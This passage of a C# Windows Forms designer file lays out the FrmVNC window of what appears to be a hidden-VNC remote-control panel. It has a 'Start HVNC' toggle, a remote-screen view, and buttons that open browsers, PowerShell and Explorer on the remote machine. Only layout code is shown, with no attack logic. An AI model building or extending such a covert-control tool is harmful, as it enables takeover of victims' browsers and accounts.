            this.test2ToolStripMenuItem.Text = "Firefox";
            this.test2ToolStripMenuItem.Click += new System.EventHandler(test2ToolStripMenuItem_Click);
            this.braveToolStripMenuItem.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.braveToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.braveToolStripMenuItem.BorderRadius = 8;
            this.braveToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.braveToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.braveToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.braveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("braveToolStripMenuItem.Image");
            this.braveToolStripMenuItem.Location = new System.Drawing.Point(855, 15);
            this.braveToolStripMenuItem.Name = "braveToolStripMenuItem";
            this.braveToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.braveToolStripMenuItem.ShadowDecoration.BorderRadius = 10;
            this.braveToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.braveToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.braveToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.braveToolStripMenuItem.Size = new System.Drawing.Size(111, 40);
            this.braveToolStripMenuItem.TabIndex = 201;
            this.braveToolStripMenuItem.Text = "Brave";
            this.braveToolStripMenuItem.Click += new System.EventHandler(braveToolStripMenuItem_Click);
            this.edgeToolStripMenuItem.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.edgeToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.edgeToolStripMenuItem.BorderRadius = 8;
            this.edgeToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.edgeToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.edgeToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.edgeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("edgeToolStripMenuItem.Image");
            this.edgeToolStripMenuItem.Location = new System.Drawing.Point(738, 15);
            this.edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
            this.edgeToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.edgeToolStripMenuItem.ShadowDecoration.BorderRadius = 10;
            this.edgeToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.edgeToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.edgeToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.edgeToolStripMenuItem.Size = new System.Drawing.Size(111, 40);
            this.edgeToolStripMenuItem.TabIndex = 200;
            this.edgeToolStripMenuItem.Text = "Edge";
            this.edgeToolStripMenuItem.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
            this.test1ToolStripMenuItem.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.test1ToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.test1ToolStripMenuItem.BorderRadius = 8;
            this.test1ToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.test1ToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.test1ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.test1ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test1ToolStripMenuItem.Image");
            this.test1ToolStripMenuItem.Location = new System.Drawing.Point(621, 15);
            this.test1ToolStripMenuItem.Name = "test1ToolStripMenuItem";
            this.test1ToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.test1ToolStripMenuItem.ShadowDecoration.BorderRadius = 10;
            this.test1ToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.test1ToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.test1ToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.test1ToolStripMenuItem.Size = new System.Drawing.Size(111, 40);
            this.test1ToolStripMenuItem.TabIndex = 199;
            this.test1ToolStripMenuItem.Text = "Chrome";
            this.test1ToolStripMenuItem.Click += new System.EventHandler(test1ToolStripMenuItem_Click);
            this.powershellToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.powershellToolStripMenuItem.BorderRadius = 8;
            this.powershellToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.powershellToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.powershellToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.powershellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("powershellToolStripMenuItem.Image");
            this.powershellToolStripMenuItem.Location = new System.Drawing.Point(205, 36);
            this.powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
            this.powershellToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.powershellToolStripMenuItem.ShadowDecoration.BorderRadius = 8;
            this.powershellToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.powershellToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.powershellToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.powershellToolStripMenuItem.Size = new System.Drawing.Size(111, 20);
            this.powershellToolStripMenuItem.TabIndex = 198;
            this.powershellToolStripMenuItem.Text = "Powershell";
            this.powershellToolStripMenuItem.Click += new System.EventHandler(powershellToolStripMenuItem_Click);
            this.fileExplorerToolStripMenuItem.BackColor = System.Drawing.Color.Transparent;
            this.fileExplorerToolStripMenuItem.BorderRadius = 8;
            this.fileExplorerToolStripMenuItem.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.fileExplorerToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.fileExplorerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.fileExplorerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileExplorerToolStripMenuItem.Image");
            this.fileExplorerToolStripMenuItem.Location = new System.Drawing.Point(88, 13);
            this.fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
            this.fileExplorerToolStripMenuItem.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.fileExplorerToolStripMenuItem.ShadowDecoration.BorderRadius = 10;
            this.fileExplorerToolStripMenuItem.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.fileExplorerToolStripMenuItem.ShadowDecoration.Depth = 10;
            this.fileExplorerToolStripMenuItem.ShadowDecoration.Enabled = true;
            this.fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(111, 40);
            this.fileExplorerToolStripMenuItem.TabIndex = 197;
            this.fileExplorerToolStripMenuItem.Text = "Explorer";
            this.fileExplorerToolStripMenuItem.Click += new System.EventHandler(fileExplorerToolStripMenuItem_Click);
            this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
            this.CloseBtn.BorderRadius = 8;
            this.CloseBtn.FillColor = System.Drawing.Color.FromArgb(27, 27, 27);
            this.CloseBtn.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.CloseBtn.ForeColor = System.Drawing.Color.White;
            this.CloseBtn.ImageAlign = System.Windows.Forms.HorizontalAlignment.Right;
            this.CloseBtn.Location = new System.Drawing.Point(3, 10);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.PressedColor = System.Drawing.Color.FromArgb(224, 224, 224);
            this.CloseBtn.ShadowDecoration.BorderRadius = 10;
            this.CloseBtn.ShadowDecoration.Color = System.Drawing.Color.Gray;
            this.CloseBtn.ShadowDecoration.Depth = 10;
            this.CloseBtn.ShadowDecoration.Enabled = true;
            this.CloseBtn.Size = new System.Drawing.Size(79, 47);
            this.CloseBtn.TabIndex = 196;
            this.CloseBtn.Text = "Close Window";
            this.CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
            this.statusled.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.statusled.FillColor = System.Drawing.Color.Transparent;
            this.statusled.Location = new System.Drawing.Point(1226, 35);
            this.statusled.Name = "statusled";
            this.statusled.ShadowDecoration.Mode = Siticone.UI.WinForms.Enums.ShadowMode.Circle;
            this.statusled.ShadowDecoration.Parent = this.statusled;
            this.statusled.Size = new System.Drawing.Size(26, 27);
            this.statusled.TabIndex = 152;
            this.statusled.TabStop = false;
            this.ledstatus.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.ledstatus.AutoSize = true;
            this.ledstatus.ForeColor = System.Drawing.Color.Gainsboro;
            this.ledstatus.Location = new System.Drawing.Point(1137, 42);
            this.ledstatus.Name = "ledstatus";
            this.ledstatus.Size = new System.Drawing.Size(0, 13);
            this.ledstatus.TabIndex = 150;
            this.chkClone1.AutoSize = true;
            this.chkClone1.ForeColor = System.Drawing.Color.Gainsboro;
            this.chkClone1.Location = new System.Drawing.Point(256, 23);
            this.chkClone1.Name = "chkClone1";
            this.chkClone1.Size = new System.Drawing.Size(68, 13);
            this.chkClone1.TabIndex = 4;
            this.chkClone1.Text = "Resize : 50%";
            this.QualityLabel.AutoSize = true;
            this.QualityLabel.ForeColor = System.Drawing.Color.Gainsboro;
            this.QualityLabel.Location = new System.Drawing.Point(256, 8);
            this.QualityLabel.Name = "QualityLabel";
            this.QualityLabel.Size = new System.Drawing.Size(52, 13);
            this.QualityLabel.TabIndex = 5;
            this.QualityLabel.Text = "HQ : 50%";
            this.VNCBox.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.VNCBox.ErrorImage = null;
            this.VNCBox.InitialImage = null;
            this.VNCBox.Location = new System.Drawing.Point(0, 41);
            this.VNCBox.Name = "VNCBox";
            this.VNCBox.Size = new System.Drawing.Size(1261, 646);
            this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.VNCBox.TabIndex = 40;
            this.VNCBox.TabStop = false;
            this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
            this.VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter);
            this.VNCBox.MouseLeave += new System.EventHandler(VNCBox_MouseLeave);
            this.VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
            this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
            this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(244, 6);
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.ToggleHVNC);
            this.guna2Panel2.Controls.Add(this.label2);
            this.guna2Panel2.Controls.Add(this.ResizeScroll);
            this.guna2Panel2.Controls.Add(this.chkClone1);
            this.guna2Panel2.Controls.Add(this.QualityScroll);
            this.guna2Panel2.Controls.Add(this.QualityLabel);
            this.guna2Panel2.Controls.Add(this.pictureBox1);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.Size = new System.Drawing.Size(1261, 41);
            this.guna2Panel2.TabIndex = 161;
            this.ToggleHVNC.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.ToggleHVNC.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.ToggleHVNC.CheckedFillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            this.ToggleHVNC.Location = new System.Drawing.Point(1092, 8);
            this.ToggleHVNC.Name = "ToggleHVNC";
            this.ToggleHVNC.Size = new System.Drawing.Size(52, 22);
            this.ToggleHVNC.TabIndex = 198;
            this.ToggleHVNC.CheckedChanged += new System.EventHandler(ToggleHVNC_CheckedChanged);
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Hack", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(985, 12);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(103, 15);
            this.label2.TabIndex = 197;
            this.label2.Text = "Start HVNC -";
            this.ResizeScroll.Location = new System.Drawing.Point(330, 23);
            this.ResizeScroll.Name = "ResizeScroll";
            this.ResizeScroll.Size = new System.Drawing.Size(111, 16);
            this.ResizeScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
            this.ResizeScroll.TabIndex = 195;
            this.ResizeScroll.Tag = "";
            this.ResizeScroll.ThumbColor = System.Drawing.Color.FromArgb(160, 113, 255);
            this.ResizeScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(ResizeScroll_Scroll);
            this.QualityScroll.Location = new System.Drawing.Point(314, 7);
            this.QualityScroll.Name = "QualityScroll";
            this.QualityScroll.Size = new System.Drawing.Size(111, 16);
            this.QualityScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
            this.QualityScroll.TabIndex = 194;
            this.QualityScroll.Tag = "";
            this.QualityScroll.ThumbColor = System.Drawing.Color.FromArgb(160, 113, 255);
            this.QualityScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityScroll_Scroll);
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(11, 4);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(229, 33);
            this.pictureBox1.TabIndex = 152;
            this.pictureBox1.TabStop = false;
            this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(1162, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox4.TabIndex = 21;
            this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(1213, 5);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox3.TabIndex = 20;
            this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
            this.guna2DragControl1.UseTransparentDrag = true;
            this.guna2Elipse1.BorderRadius = 12;
            this.guna2Elipse1.TargetControl = this;
            this.guna2DragControl2.DockIndicatorTransparencyValue = 0.6;
            this.guna2DragControl2.TargetControl = this.guna2Panel2;
            this.guna2DragControl2.UseTransparentDrag = true;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            base.ClientSize = new System.Drawing.Size(1261, 775);
            base.Controls.Add(this.VNCBox);
            base.Controls.Add(this.panel4);
            base.Controls.Add(this.guna2Panel2);
            base.Controls.Add(this.guna2ResizeBox1);
            base.Controls.Add(this.statusStrip1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(1120, 632);
            base.Name = "FrmVNC";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
            base.Load += new System.EventHandler(VNCForm_Load);
            base.Click += new System.EventHandler(VNCForm_Click);
            base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(VNCForm_KeyPress);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.statusled).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}
